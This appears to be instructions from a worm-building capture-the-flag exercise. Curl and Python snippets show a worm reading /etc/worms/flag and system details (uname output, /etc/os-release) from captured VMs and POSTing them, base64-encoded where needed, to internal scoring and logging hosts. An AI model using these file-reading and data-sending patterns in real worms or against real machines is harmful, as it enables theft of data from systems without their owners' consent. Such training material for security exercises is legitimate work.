Submit flags and logs

Make your worm use these commands to capture a VM or write logging information. Capturing a VM means submitting its flag: the whole content of /etc/worms/flag on that VM, exactly as it is. A request is at most 4 KiB.

Highlighted parts are what your worm fills in.

Capture a VM: submit its whole flag file

curl -X POST https://scoring.worms.internal/submit \
  -H "Content-Type: application/json" \
  -d "{\"vm_flag\":\"$(cat /etc/worms/flag)\"}"

Log a JSON object

curl -X POST https://logging.worms.internal/submit \
  -H "Content-Type: application/json" \
  -d '{"log_data":{"event":"captured","vm":"B"}}'

Log any output, base64-encoded: the JSON stays valid whatever it holds

DATA=$(uname -a | base64 -w0)
curl -X POST https://logging.worms.internal/submit \
  -H "Content-Type: application/json" \
  -d "{\"log_data\":{\"b64\":\"$DATA\"}}"

Once, at the top

import base64, json, urllib.request

def submit(url, body):
    request = urllib.request.Request(url, data=json.dumps(body).encode(), method="POST",
                                     headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(request, timeout=10) as response:
        return response.status

Capture a VM: submit its whole flag file

flag = open("/etc/worms/flag").read().strip()
submit("https://scoring.worms.internal/submit", {"vm_flag": flag})

Log a JSON object

submit("https://logging.worms.internal/submit", {"log_data": {"event": "captured", "vm": "B"}})

Log any bytes, base64-encoded: the JSON stays valid whatever they hold

data = open("/etc/os-release", "rb").read()
submit("https://logging.worms.internal/submit", {"log_data": {"b64": base64.b64encode(data).decode()}})

Base64 makes the data a third larger: about 3 KiB of output fit in one request. Split anything longer.
